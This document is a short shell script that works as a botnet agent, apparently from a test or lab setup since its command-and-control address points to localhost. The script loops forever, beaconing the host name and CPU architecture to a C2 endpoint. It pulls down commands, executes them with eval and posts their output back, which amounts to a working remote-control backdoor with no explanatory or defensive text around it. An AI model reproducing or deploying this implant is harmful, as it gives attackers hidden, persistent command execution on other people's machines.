#!/bin/sh
C2_HTTP='http://127.0.0.1:10001/beacon'
MY_ID=$(hostname)
while true; do
  ARCH=$(uname -m)
  BEACON="{\"host\":\"$MY_ID\",\"bot_host\":\"$MY_ID\",\"arch\":\"$ARCH\",\"platform\":\"linux\"}"
  RESP=$(curl -s --connect-timeout 10 -X POST "$C2_HTTP" -H "Content-Type: application/json" -d "$BEACON" 2>/dev/null)
  if echo "$RESP" | grep -q 'cmd_id'; then
    CMDID=$(echo "$RESP" | sed 's/.*"cmd_id":"\([^"]*\)".*/\1/' | head -1)
    CMD=$(echo "$RESP" | sed 's/.*"command":"\([^"]*\)".*/\1/' | head -1)
    if [ -n "$CMDID" ]; then
      OUT=$(eval "$CMD" 2>&1)
      curl -s --connect-timeout 10 -X POST "$C2_HTTP" -H "Content-Type: application/json" -d "{\"cmd_id\":\"$CMDID\",\"bot_id\":\"$MY_ID\",\"output\":\"$OUT\"}" >/dev/null 2>&1
    fi
  fi
  sleep 120
done